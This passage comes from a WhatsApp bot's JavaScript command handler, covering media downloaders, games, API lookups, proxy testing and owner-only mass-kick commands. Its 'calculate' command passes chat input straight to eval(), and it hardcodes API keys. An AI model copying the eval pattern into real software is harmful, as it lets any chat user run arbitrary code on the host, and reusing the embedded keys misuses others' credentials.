                const r2 = await axios.get(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(text)}`, { timeout: 12000 });
                const d2 = r2.data;
                if (d2?.video?.noWatermark) {
                    videoUrl = d2.video.noWatermark;
                    videoTitle = d2.title || 'TikTok Video';
                }
            } catch (_) {}
        }

        // FALLBACK 2: snaptiksave
        if (!videoUrl) {
            try {
                const r3 = await axios.get(`https://www.tikwm.com/api/?url=${encodeURIComponent(text)}`, { timeout: 12000 });
                // ✅ FIX: tikwm GET uses 'play' field (same as POST), not 'video'
                if (r3.data?.data?.play || r3.data?.data?.video) {
                    videoUrl = r3.data.data.play || r3.data.data.video;
                }
            } catch (_) {}
        }

        if (!videoUrl) {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply('❌ *Download failed* • Link expired or private video. Try again.');
        }

        await devtrust.sendMessage(m.chat,
            {
                video: { url: videoUrl },
                caption: `🎵 *${videoTitle.substring(0, 100)}*\n\n✅ *No Watermark*`
            },
            { quoted: m }
        );
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (e) {
        console.error('[TIKTOK]', e.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply('❌ *TikTok download failed* • Try again later');
    }
}
break;

case 'apk':
case 'apkdl': {
    if (!text) return reply(`📱 *APK Search & Download*\n\nUsage: ${prefix + command} [app name]\nExample: ${prefix + command} WhatsApp`);

    await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
    try {
        const searchRes = await axios.get(`https://api.princetechn.com/api/search/happymod?apikey=prince&query=${encodeURIComponent(text.trim())}`, { timeout: 20000 });
        const sData = searchRes.data;

        if (!sData.success || !sData.results?.data?.length) {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply(`❌ *"${text}"* ke liye koi app nahi mila. Koi aur naam try karo.`);
        }

        const apps = sData.results.data.slice(0, 8);
        const menuText = apps.map((a, i) =>
            `*${i + 1}.* ${a.name}\n    📝 ${(a.summary || '').substring(0, 55)}`
        ).join('\n\n');

        const sentMsg = await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: apps[0].icon },
                caption: `📱 *APK Search Results*\n🔎 Query: *${text}*\n📦 Source: F-Droid (Free & Open Source)\n\n${menuText}\n\n📌 *Number reply karo download ke liye*`
            }),
            { quoted: m }
        );

        const _apkHandler = async (msgUpdate) => {
            try {
                const msg = msgUpdate?.messages[0];
                if (!msg?.message) return;
                const replyTxt = (msg.message.extendedTextMessage?.text || msg.message.conversation || '').trim();
                const stanzaId = msg.message.extendedTextMessage?.contextInfo?.stanzaId;
                if (stanzaId !== sentMsg?.key?.id) return;

                const num = parseInt(replyTxt);
                if (isNaN(num) || num < 1 || num > apps.length) return;

                devtrust.ev.off('messages.upsert', _apkHandler);
                await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: msg.key } });

                const chosen = apps[num - 1];
                // Extract package ID from F-Droid URL
                const pkgId = chosen.url.split('/packages/')[1]?.split('/')[0];

                await devtrust.sendMessage(m.chat, { text: `⬇️ *${chosen.name}*\nDownload preparing...` }, { quoted: msg });

                // Get APK download URL from F-Droid API
                const fdRes = await axios.get(`https://f-droid.org/api/v1/packages/${pkgId}/suggested`, { timeout: 15000 });
                const fdData = fdRes.data;

                if (!fdData || !fdData.apkName) throw new Error('APK download link nahi mila');

                const apkUrl = `https://f-droid.org/repo/${fdData.apkName}`;
                const apkBuf = Buffer.from((await axios.get(apkUrl, {
                    responseType: 'arraybuffer',
                    headers: { 'User-Agent': 'Mozilla/5.0' },
                    timeout: 180000,
                    maxContentLength: 200 * 1024 * 1024
                })).data);

                if (chosen.icon) {
                    await devtrust.sendMessage(m.chat, addNewsletterContext({
                        image: { url: chosen.icon },
                        caption: `📦 *${chosen.name}*\n📝 ${chosen.summary || ''}\n🆔 Package: ${pkgId}`
                    }), { quoted: msg });
                }

                await devtrust.sendMessage(m.chat, {
                    document: apkBuf,
                    fileName: `${chosen.name.replace(/[<>:"/\\|?*]+/g, '').substring(0, 50)}.apk`,
                    mimetype: 'application/vnd.android.package-archive',
                    caption: `✅ *${chosen.name}*`
                }, { quoted: msg });

                await devtrust.sendMessage(m.chat, { react: { text: '✅', key: msg.key } });

            } catch (e) {
                console.error('apk handler error:', e.message);
                await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                reply(`❌ *APK download failed:* ${e.message}`);
            }
        };

        devtrust.ev.on('messages.upsert', _apkHandler);
        setTimeout(() => devtrust.ev.off('messages.upsert', _apkHandler), 120000);

    } catch (e) {
        console.error('apk search error:', e.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ *APK Search failed:* ${e.message}`);
    }
}
break;

case 'tomp4': {
    if (!m.quoted) return reply("🖼️ *Reply to a sticker/gif* with tomp4");
    let mime = m.quoted.mimetype || '';
    if (!/webp|gif/.test(mime)) return reply("⚠️ *Reply must be a sticker or gif*");

    try {
        let media = await m.quoted.download();
        let inputPath = `./tmp/${Date.now()}.${mime.includes('gif') ? 'gif' : 'webp'}`;
        let outputPath = `./tmp/${Date.now()}.mp4`;
        
        if (!fs.existsSync('./tmp')) fs.mkdirSync('./tmp', { recursive: true });
        
        fs.writeFileSync(inputPath, media);
        
        // Simple conversion command
        exec(`ffmpeg -i ${inputPath} -c:v libx264 -pix_fmt yuv420p ${outputPath}`, async (err) => {
            if (err) {
                console.log(err);
                return reply("❌ *Conversion failed*");
            }
            
            let converted = fs.readFileSync(outputPath);
            await devtrust.sendMessage(m.chat, 
                addNewsletterContext({
                    video: converted,
                    mimetype: 'video/mp4',
                    caption: "🎬 *Converted to MP4*"
                }), 
                { quoted: m }
            );
            
            try { 
                fs.unlinkSync(inputPath); 
                fs.unlinkSync(outputPath); 
            } catch (e) {}
        });
        
    } catch (e) {
        console.log(e);
        reply("❌ *Conversion failed*");
    }
}
break;

case 'tomp3': {
    if (!m.quoted) return reply("🎥 *Reply to a video* with tomp3");
    let mime = m.quoted.mimetype || '';
    if (!/video/.test(mime)) return reply("⚠️ *Reply to a video only*");

    try {
        let media = await devtrust.downloadMediaMessage(m.quoted);
        
        await devtrust.sendMessage(m.chat, 
            {
                audio: media,
                mimetype: 'audio/mpeg',
                ptt: false
            }, 
            { quoted: m }
        );
    } catch (e) {
        console.log(e);
        reply("❌ *Conversion failed*");
    }
}
break;

case 'kickadmins': {
    if (!m.isGroup) return reply(m.group);
    if (!isCreator && !isSudo) 
        return reply('🔒 *Owner/Sudo only*');

    let metadata = await devtrust.groupMetadata(m.chat);
    let participants = metadata.participants;
    let kicked = 0;

    for (let member of participants) {
        if (member.id === botNumber) continue;
        if (member.id === m.sender) continue;

        if (member.admin === "superadmin" || member.admin === "admin") {
            await devtrust.groupParticipantsUpdate(m.chat, [member.id], 'remove');
            kicked++;
            await sleep(1500);
        }
    }

    reply(`✅ *${kicked} admins removed*`);
}
break;

case 'kickall': {
    if (!m.isGroup) return reply(m.group);
    if (!isCreator && !isSudo)
        return reply('🔒 *Owner/Sudo only*');

    let metadata = await devtrust.groupMetadata(m.chat);
    let participants = metadata.participants;

    // Collect all removable members at once for instant batch removal
    const toRemove = participants
        .filter(member => member.id !== botNumber)
        .filter(member => member.admin !== 'superadmin' && member.admin !== 'admin')
        .map(member => member.id);

    if (toRemove.length === 0)
        return reply('⚠️ *No removable members found (only bot/admins remain)*');

    // Single API call — nanosecond speed (Baileys handles batch natively)
    const result = await devtrust.groupParticipantsUpdate(m.chat, toRemove, 'remove');
    const kicked = Array.isArray(result) ? result.length : toRemove.length;

    reply(`✅ *${kicked} members kicked instantly*`);
}
break;

case 'coffee': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://coffee.alexflipnote.dev/random' },
            caption: "☕ *Fresh coffee just for you*"
        }), 
        { quoted: m }
    );
}
break;

case 'myip': {
    if (!isCreator) return reply("🔒 *Owner only*");
    
    try {
        var http = require('http');
        http.get({
            'host': 'api.ipify.org',
            'port': 80,
            'path': '/'
        }, function(resp) {
            let ipData = '';
            resp.on('data', function(chunk) {
                ipData += chunk;
            });
            resp.on('end', function() {
                reply(`🌐 *Your IP Address:*\n\`${ipData}\``);
            });
        }).on('error', function(e) {
            reply(`❌ *Error fetching IP:* ${e.message}`);
        });
    } catch (e) {
        reply(`❌ *Error:* ${e.message}`);
    }
    break;
}

case 'proxytest': {
    if (!isCreator) return reply("🔒 *Owner only*");

    await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });

    try {
        const { SocksProxyAgent } = require('socks-proxy-agent');
        const https = require('https');

        const PK_PROXIES = [
            'socks5://103.82.134.1:1080',
            'socks5://182.191.84.2:4153',
            'socks5://103.216.82.53:6667',
            'socks5://103.255.4.246:4153',
            'socks5://119.160.116.253:1080',
            'socks5://119.160.116.252:4153',
            'socks5://111.68.26.237:8080',
        ];

        reply(`🔍 *CYBER Proxy Test*\n\n_${PK_PROXIES.length} Pakistani proxies test ho rahi hain..._`);

        let results = '';
        let workingProxy = null;

        for (const proxyUrl of PK_PROXIES) {
            try {
                const agent = new SocksProxyAgent(proxyUrl, { timeout: 6000 });
                const ip = await new Promise((resolve, reject) => {
                    const req = https.get({
                        hostname: 'api.ipify.org',
                        path: '/',
                        agent,
                        timeout: 6000,
                    }, (res) => {
                        let data = '';
                        res.on('data', c => data += c);
                        res.on('end', () => resolve(data.trim()));
                    });
                    req.on('error', reject);
                    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
                });
                results += `✅ ${proxyUrl.split('//')[1]} → IP: ${ip}\n`;
                if (!workingProxy) workingProxy = { url: proxyUrl, ip };
            } catch (e) {
                results += `❌ ${proxyUrl.split('//')[1]} → ${e.message}\n`;
            }
        }

        const status = workingProxy
            ? `✅ *Working proxy mila!*\n🌐 IP: \`${workingProxy.ip}\`\n🔗 ${workingProxy.url}`
            : `⚠️ *Koi proxy kaam nahi kiya*\nBot direct (USA IP) se connect hai`;

        reply(`🇵🇰 *CYBER Proxy Test Results*\n\n${status}\n\n*Details:*\n${results}`);
        await devtrust.sendMessage(m.chat, { react: { text: workingProxy ? '✅' : '❌', key: m.key } });

    } catch (e) {
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ *Proxy test failed*\nsocks-proxy-agent install nahi — \`npm install\` karo server pe`);
    }
    break;
}

case "sciencefact": {
    try {
        const res = await axios.get("https://uselessfacts.jsph.pl/random.json?language=en");
        reply(`🔬 *Science Fact*\n\n${res.data.text}`);
    } catch {
        reply("❌ *Fact machine broke* • Try again later");
    }
}
break;

case "book": {
    if (!text) return reply("📚 *Example:* book Harry Potter");
    
    try {
        const res = await axios.get(`https://openlibrary.org/search.json?q=${encodeURIComponent(text)}&limit=3`);
        if (!res.data.docs.length) return reply("❌ *No books found*");
        
        const books = res.data.docs.map((b,i) => 
            `${i+1}. *${b.title}*\n👤 ${b.author_name?.[0] || "Unknown"}`
        ).join("\n\n");
        
        reply(`📚 *Book Search*\n\n${books}`);
    } catch {
        reply("❌ *Search failed* • Library is closed");
    }
}
break;

case "recipe": {
    if (!text) return reply("🍳 *Example:* recipe pancakes");
    
    try {
        const res = await axios.get(`https://www.themealdb.com/api/json/v1/1/search.php?s=${encodeURIComponent(text)}`);
        if (!res.data.meals) return reply("❌ *No recipes found*");
        
        const meal = res.data.meals[0];
        const ingredients = Array.from({length:20})
            .map((_,i) => meal[`strIngredient${i+1}`] ? `• ${meal[`strIngredient${i+1}`]} - ${meal[`strMeasure${i+1}`]}` : '')
            .filter(Boolean)
            .join("\n");
        
        const msg = `🍽 *${meal.strMeal}*\n\n${ingredients}`;
        reply(msg);
    } catch {
        reply("❌ *Recipe fetch failed* • Kitchen's closed");
    }
}
break;

case "remind": {
    if (!text) return reply("⏰ *Usage:* remind 10m Namaz\n\n*Time formats:*\n• 30s = 30 seconds\n• 5m = 5 minutes\n• 2h = 2 hours");
    
    const parts = text.split(" ");
    const timeStr = parts[0].toLowerCase();
    const msgText = parts.slice(1).join(" ");
    
    if (!msgText) return reply("❌ *Format:* remind 5m apna message likho");
    
    let ms = 0;
    if (timeStr.endsWith('h')) ms = parseInt(timeStr) * 3600000;
    else if (timeStr.endsWith('m')) ms = parseInt(timeStr) * 60000;
    else if (timeStr.endsWith('s')) ms = parseInt(timeStr) * 1000;
    else ms = parseInt(timeStr) * 60000; // default minutes
    
    if (isNaN(ms) || ms <= 0) return reply("❌ *Invalid time*\nExample: 5m, 30s, 2h");
    if (ms > 86400000) return reply("❌ *Max 24 hours allowed*");
    
    const readableTime = timeStr.endsWith('h') ? `${parseInt(timeStr)} ghante` 
        : timeStr.endsWith('s') ? `${parseInt(timeStr)} seconds`
        : `${parseInt(timeStr)} minute`;
    
    reply(`✅ *Reminder set!*\n⏰ ${readableTime} baad yaad dilaunga:\n"${msgText}"`);
    
    setTimeout(() => {
        devtrust.sendMessage(m.sender, { 
            text: `⏰ *REMINDER!*\n\n"${msgText}"\n\n_(${readableTime} pehle set kiya tha)_` 
        });
    }, ms);
}
break;

case "define":
case "dictionary": {
    if (!text) return reply("📖 *Example:* define computer");
    
    try {
        const res = await axios.get(`https://api.dictionaryapi.dev/api/v2/entries/en/${text}`);
        const meanings = res.data[0].meanings[0].definitions[0].definition;
        reply(`📖 *${text}*\n\n${meanings}`);
    } catch {
        reply("❌ *Word not found*");
    }
}
break;

case "currencies":
case "currency": {
    if (!text) {
        return reply(`💱 *CYBER Currency*\n\nUsage: ${prefix}currency [amount] [from] [to]\nExample: ${prefix}currency 100 USD EUR\n\nOr use: ${prefix}currencies to see all available codes`);
    }
    
    const [amount, from, to] = text.split(" ");
    
    // If all three arguments provided, do conversion
    if (amount && from && to) {
        try {
            await devtrust.sendMessage(m.chat, { react: { text: '💱', key: m.key } });
            
            const response = await axios.get(`https://api.frankfurter.app/latest?amount=${amount}&from=${from.toUpperCase()}&to=${to.toUpperCase()}`, {
                timeout: 10000
            });
            
            if (!response.data || !response.data.rates || !response.data.rates[to.toUpperCase()]) {
                throw new Error('Invalid currency code or response');
            }
            
            const converted = response.data.rates[to.toUpperCase()];
            reply(`💱 *CYBER Currency*\n\n${amount} ${from.toUpperCase()} = *${converted} ${to.toUpperCase()}*\n\n_Rate as of ${response.data.date}_`);
            await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            
        } catch (error) {
            console.error('Currency error:', error.message);
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            reply(`⚠️ *CYBER Currency*\n\nInvalid currency code ya service down. Valid codes: USD, EUR, GBP, PKR, SAR, AED, INR`);
        }
        return;
    }
    
    // If no arguments or just "currencies", show available currencies
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '💱', key: m.key } });
        
        const response = await axios.get('https://api.frankfurter.app/currencies', {
            timeout: 10000
        });
        
        if (!response.data) throw new Error('API Error');

        const entries = Object.entries(response.data);
        let currencyList = `💱 *CYBER Currencies*\n\n`;
        
        entries.slice(0, 40).forEach(([code, name], i) => {
            currencyList += `${i + 1}. *${code}* - ${name}\n`;
        });
        
        currencyList += `\n_Use ${prefix}currency [amount] [from] [to] to convert_\nExample: ${prefix}currency 100 USD PKR`;
        
        reply(currencyList);
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (err) {
        console.error('Currencies error:', err.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`⚠️ *CYBER Currencies*\n\nCurrency list unavailable. Try again later.`);
    }
}
break;

case "genpass": {
    const length = parseInt(text) || 12;
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
    let pass = "";
    for (let i=0; i<length; i++) 
        pass += chars.charAt(Math.floor(Math.random()*chars.length));
    
    reply(`🔑 *Generated Password*\n\n${pass}`);
}
break;

case "readqr": {
    if (!m.quoted || !m.quoted.image) 
        return reply("📱 *Reply to a QR code image*");
    
    const buffer = await m.quoted.download();
    
    try {
        const res = await axios.post("https://api.qrserver.com/v1/read-qr-code/", buffer, {
            headers: { "Content-Type": "multipart/form-data" }
        });
        const qrText = res.data[0].symbol[0].data;
        reply(`📱 *QR Code Content*\n\n${qrText}`);
    } catch (e) {
        reply("❌ *Failed to read QR code*");
    }
}
break;

case 'weather':
case 'weather2':
case 'weatherinfo': {
    if (!text) return reply(`🌤 *CYBER Weather*\n\nUsage: ${prefix}${command} [city]\nExample: ${prefix}${command} LonCYBER`);
    
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '🌤️', key: m.key } });
        
        reply(`🔍 *CYBER Weather*\n\nChecking forecast for ${text}...`);
        
        const response = await axios.get(
            `https://api.openweathermap.org/data/2.5/weather?q=${encodeURIComponent(text)}&units=metric&appid=d97e458517de3eac6d3c50abcdcbe0e7`,
            { timeout: 10000 }
        );
        
        const data = response.data;
        
        const weatherInfo = `📍 *${data.name}, ${data.sys.country}*\n` +
                           `🌡️ ${data.main.temp}°C (feels like ${data.main.feels_like}°C)\n` +
                           `☁️ ${data.weather[0].description}\n` +
                           `💧 ${data.main.humidity}% humidity\n` +
                           `🌬️ ${data.wind.speed} m/s wind`;
        
        reply(`🌤 *CYBER Weather*\n\n${weatherInfo}`);
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Weather Error:', error.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`⚠️ *CYBER Weather*\n\nWeather service is offline. Try again later.`);
    }
}
break;

case "calculate": {
    if (!text) return reply("🧮 *Example:* calculate 12+25*3");
    
    try {
        const result = eval(text);
        reply(`🧮 *Result*\n\n${text} = ${result}`);
    } catch {
        reply("❌ *Invalid expression*");
    }
}
break;

case 'wiki':
case 'wikipedia': {
    if (!text) {
        return reply(`📚 *CYBER Wikipedia*\n\nUsage: ${prefix}${command} [search term]\nExample: ${prefix}${command} Albert Einstein`);
    }
    
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '📚', key: m.key } });
        
        reply(`🔍 *CYBER Wikipedia*\n\nSearching: ${text}`);
        
        const response = await axios.get(
            `https://en.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(text)}`,
            { timeout: 10000 }
        );
        
        const data = response.data;
        
        // Handle disambiguation pages (multiple results)
        if (data.type === 'disambiguation') {
            return reply(`❌ *CYBER Wikipedia*\n\n"${text}" is too broad. Please be more specific.`);
        }
        
        // Check if extract exists
        if (!data.extract) {
            return reply(`❌ *CYBER Wikipedia*\n\nNo results found for "${text}". Try a different term.`);
        }
        
        // Truncate long extracts
        const extract = data.extract.length > 500 
            ? data.extract.substring(0, 500) + '...' 
            : data.extract;
        
        const info = `📚 *${data.title}*\n\n${extract}\n\n🔗 ${data.content_urls.desktop.page}`;
        
        // Send with thumbnail if available
        if (data.thumbnail) {
            await devtrust.sendMessage(m.chat, 
                addNewsletterContext({
                    image: { url: data.thumbnail.source },
                    caption: info
                }), 
                { quoted: m }
            );
        } else {
            reply(`📚 *CYBER Wikipedia*\n\n${info}`);
        }
        
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Wiki Error:', error.response?.data || error.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        
        if (error.response?.status === 404) {
            return reply(`❌ *CYBER Wikipedia*\n\nPage "${text}" not found. Try another term.`);
        }
        
        reply(`⚠️ *CYBER Wikipedia*\n\nWikipedia is taking a break. Try again later.`);
    }
}
break;

// ============ HANGMAN GAME ============
case "hangman": {
    const chatId = m.chat;
    const args = text?.split(" ") || [];
    let game = hangmanGames[chatId];

    // Start new game
    if (!game) {
        if (!args[0]) return reply("🎮 *Start:* hangman banana");
        
        const word = args[0].toLowerCase();
        const display = "_".repeat(word.length).split("");
        hangmanGames[chatId] = { 
            word, 
            display, 
            attempts: 6, 
            guessed: [],
            wrongGuesses: 0
        };
        
        const visual = hangmanVisual[0]; // First visual (6 attempts left)
        
        reply(`🎮 *Hangman Started*\n\n` +
              `${visual}\n\n` +
              `Word: ${display.join(" ")}\n` +
              `Attempts: 6\n` +
              `Guess: hangman [letter]`);
        return;
    }

    // Make a guess
    if (!args[0]) return reply("🔤 *Guess a letter* • Example: hangman a");
    
    const letter = args[0].toLowerCase();
    if (letter.length !== 1) return reply("❌ *One letter at a time*");
    if (!/[a-z]/.test(letter)) return reply("❌ *Letters only*");
    if (game.guessed.includes(letter)) return reply("⚠️ *Already guessed*");

    game.guessed.push(letter);
    
    if (game.word.includes(letter)) {
        // Correct guess
        game.display = game.display.map((c, i) => (game.word[i] === letter ? letter : c));
    } else {
        // Wrong guess
        game.wrongGuesses += 1;
        game.attempts -= 1;
    }

    // Get current hangman visual
    const visualIndex = Math.min(game.wrongGuesses, hangmanVisual.length - 1);
    const visual = hangmanVisual[visualIndex];

    // Check win condition
    if (!game.display.includes("_")) {
        reply(`🎉 *You won!*\n\nWord: ${game.word}\n\n${visual}`);
        delete hangmanGames[chatId];
        return;
    }

    // Check lose condition
    if (game.attempts <= 0) {
        reply(`💀 *Game over!*\n\nWord: ${game.word}\n\n${visual}`);
        delete hangmanGames[chatId];
        return;
    }

    // Game continues
    reply(`🎮 *Hangman*\n\n` +
          `${visual}\n\n` +
          `Word: ${game.display.join(" ")}\n` +
          `Attempts: ${game.attempts}\n` +
          `Guessed: ${game.guessed.join(", ")}`);
}
break;
// ======================================

case "numbattle": {
    const userRoll = Math.floor(Math.random() * 100) + 1;
    const botRoll = Math.floor(Math.random() * 100) + 1;
    
    let result = userRoll > botRoll ? "🎉 *You win!*" : 
                 userRoll < botRoll ? "😢 *You lose!*" : "🤝 *It's a tie!*";
    
    reply(`🎲 *Number Battle*\n\nYou: ${userRoll}\nBot: ${botRoll}\n\n${result}`);
}
break;

case "coinbattle": {
    const userFlip = Math.random() < 0.5 ? "Heads" : "Tails";
    const botFlip = Math.random() < 0.5 ? "Heads" : "Tails";
    
    let result = userFlip === botFlip ? "🎉 *You win!*" : "😢 *You lose!*";
    
    reply(`🪙 *Coin Battle*\n\nYou: ${userFlip}\nBot: ${botFlip}\n\n${result}`);
}
break;

case "numberbattle": {
    if (!text) return reply("🎯 *Usage:* numberbattle 25");
    
    const number = Math.floor(Math.random() * 50) + 1;
    const guess = parseInt(text);
    
    let result = guess === number ? "🎉 *Perfect guess!*" : 
                 guess > number ? "⬇️ *Too high!*" : "⬆️ *Too low!*";
    
    reply(`🎯 *Number Battle*\n\nYour guess: ${guess}\nTarget: ${number}\n\n${result}`);
}
break;

case "math": {
    const a = Math.floor(Math.random() * 50) + 1;
    const b = Math.floor(Math.random() * 50) + 1;
    
    reply(`➕ *Math Quiz*\n\n${a} + ${b} = ?\nReply: mathanswer number`);
}
break;

case "emojiquiz": {
    const quizzes = [
        { emoji: "🐍", answer: "snake" },
        { emoji: "🍎", answer: "apple" },
        { emoji: "🏎️", answer: "car" },
        { emoji: "🎸", answer: "guitar" },
        { emoji: "☕", answer: "coffee" }
    ];
    
    const quiz = quizzes[Math.floor(Math.random() * quizzes.length)];
    reply(`🧩 *Emoji Quiz*\n\n${quiz.emoji}\nReply: emojianswer your guess`);
}
break;

case "dice": {
    const roll = Math.floor(Math.random() * 6) + 1;
    reply(`🎲 *You rolled a ${roll}!*`);
}
break;

case "rpsls": {
    if (!text) return reply("🪨 *Choose:* rock, paper, scissors, lizard, spock");
    
    const choices = ["rock", "paper", "scissors", "lizard", "spock"];
    const userChoice = text.toLowerCase();
    
    if (!choices.includes(userChoice)) 
        return reply("❌ *Invalid choice* • Use rock, paper, scissors, lizard, spock");

    const botChoice = choices[Math.floor(Math.random() * choices.length)];

    const winMap = {
        rock: ["scissors", "lizard"],
        paper: ["rock", "spock"],
        scissors: ["paper", "lizard"],
        lizard: ["spock", "paper"],
        spock: ["scissors", "rock"]
    };

    let result = userChoice === botChoice ? "🤝 *It's a tie!*" :
                 winMap[userChoice].includes(botChoice) ? "🎉 *You win!*" : "😢 *You lose!*";

    reply(`🪨 *RPSLS*\n\nYou: ${userChoice}\nBot: ${botChoice}\n\n${result}`);
}
break;
case "coin": {
    const result = Math.random() < 0.5 ? "🪙 Heads" : "🪙 Tails";
    await devtrust.sendMessage(m.chat, { text: `🎲 Coin Flip Result: ${result}` }, { quoted: m });
}
break;
case "gamefact": {
    try {
        const res = await axios.get("https://www.freetogame.com/api/games");
        const games = res.data;
        const game = games[Math.floor(Math.random() * games.length)];
        
        reply(`🎮 *${game.title}*\n🎭 ${game.genre}\n📱 ${game.platform}\n🔗 ${game.game_url}`);
    } catch (e) {
        console.error("GAMEFACT ERROR:", e);
        reply("❌ *Game fact unavailable* • Server offline");
    }
}
break;

case "fox": {
    try {
        const res = await axios.get("https://randomfox.ca/floof/");
        const img = res.data?.image;
        if (!img) return reply("❌ *Fox ran away* • Try again");
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: img },
                caption: "🦊 *Random Fox*"
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error("FOX ERROR:", e);
        reply("❌ *Fox hunt failed* • API is sleeping");
    }
}
break;

case "bchcn": {
    try {
        const res = await axios.get("https://some-random-api.com/animal/koala");
        const img = res.data?.image || res.data?.link;
        if (!img) return reply("❌ *Koala hiding* • Try again");
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: img },
                caption: "🐨 *Random Koala*"
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error("KOALA ERROR:", e);
        reply("❌ *Koala fetch failed* • Eucalyptus shortage");
    }
}
break;

case "hxjxjjkm": {
    try {
        const res = await axios.get("https://some-random-api.com/animal/birb");
        const img = res.data?.image || res.data?.link;
        if (!img) return reply("❌ *Bird flew away* • Try again");
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: img },
                caption: "🐦 *Random Bird*"
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error("BIRD ERROR:", e);
        reply("❌ *Bird migration failed* • Try later");
    }
}
break;

case "panda": {
    try {
        const res = await axios.get("https://some-random-api.com/animal/panda");
        const img = res.data?.image || res.data?.link;
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: img },
                caption: "🐼 *Random Panda*"
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error("PANDA ERROR:", e);
        reply("❌ *Panda on vacation* • Try again");
    }
}
break;

case "funfact": {
    try {
        const res = await axios.get("https://uselessfacts.jsph.pl/random.json?language=en");
        const fact = res.data?.text || "Bots are awesome!";
        reply(`💡 *Fun Fact*\n\n${fact}`);
    } catch (e) {
        console.error("FUNFACT ERROR:", e);
        reply("❌ *Fact machine broke* • Try again later");
    }
}
break;

case "vkfkk": {
    try {
        const res = await axios.get("https://zenquotes.io/api/random", { timeout: 8000 });
        const quote = (Array.isArray(res.data) ? res.data[0]?.q : res.data?.content) || "Keep pushing forward!";
        const author = (Array.isArray(res.data) ? res.data[0]?.a : res.data?.author) || "Unknown";
        reply(`🖋 *"${quote}"*\n— ${author}`);
    } catch (e) {
        console.error("QUOTEMEME ERROR:", e);
        reply("❌ *Quote generator is silent* • Try later");
    }
}
break;

case "prog": {
    try {
        const res = await axios.get("https://v2.jokeapi.dev/joke/Programming?type=single");
        const joke = res.data?.joke || "Why do programmers prefer dark mode? Light attracts bugs!";
        reply(`💻 *Programming Joke*\n\n${joke}`);
    } catch (e) {
        console.error("PROG JOKE ERROR:", e);
        reply("❌ *Joke compiler error* • Try again");
    }
}
break;

case "dadjoke": {
    try {
        const res = await axios.get("https://icanhazdadjoke.com/", { headers: { Accept: "application/json" } });
        const joke = res.data?.joke || "I'm still working on it!";
        reply(`👴 *Dad Joke*\n\n${joke}`);
    } catch (e) {
        console.error("DAD JOKE ERROR:", e);
        reply("❌ *Dad left for milk* • Try later");
    }
}
break;

case "progquote": {
    try {
        const res = await axios.get("https://zenquotes.io/api/random");
        const q = res.data?.[0];
        const quote = q?.q || "Talk is cheap. Show me the code.";
        const author = q?.a || "Linus Torvalds";
        reply(`💻 *"${quote}"*\n— ${author}`);
    } catch (e) {
        const quotes = [
            { q: "Talk is cheap. Show me the code.", a: "Linus Torvalds" },
            { q: "Programs must be written for people to read, and only incidentally for machines to execute.", a: "Harold Abelson" },
            { q: "Any fool can write code that a computer can understand. Good programmers write code that humans can understand.", a: "Martin Fowler" },
            { q: "First, solve the problem. Then, write the code.", a: "John Johnson" },
            { q: "Java is to JavaScript what car is to Carpet.", a: "Chris Heilmann" }
        ];
        const random = quotes[Math.floor(Math.random() * quotes.length)];
        reply(`💻 *"${random.q}"*\n— ${random.a}`);
    }
}
break;

case "asciivjxnd": {
    if (!text) return reply("✏️ *Example:* ascii Hello");
    
    try {
        // artii.herokuapp.com is dead, use simple text fallback
        const ascii = text.toUpperCase();
        reply(`🎨 *ASCII Art*\n\n\`\`\`${ascii}\`\`\``);
    } catch (e) {
        console.error("ASCII ERROR:", e);
        reply("❌ *ASCII generator failed*");
    }
}
break;

case "guess": {
    const number = Math.floor(Math.random() * 10) + 1;
    if (!text) return reply("🎲 *Usage:* guess 7");
    
    const guess = parseInt(text);
    if (isNaN(guess) || guess < 1 || guess > 10) 
        return reply("❌ *Choose 1-10*");
    
    const result = guess === number ? "🎉 *Correct!*" : "😢 *Wrong guess*";
    reply(`🎯 *Guess Game*\n\nYou: ${guess}\nBot: ${number}\n${result}`);
}
break;

case "moviequote": {
    try {
        const res = await axios.get("https://zenquotes.io/api/random");
        const q = res.data?.[0];
        const quote = q?.q || "May the Force be with you.";
        const author = q?.a || "Unknown";
        reply(`🎬 *"${quote}"*\n— ${author}`);
    } catch (e) {
        const quotes = [
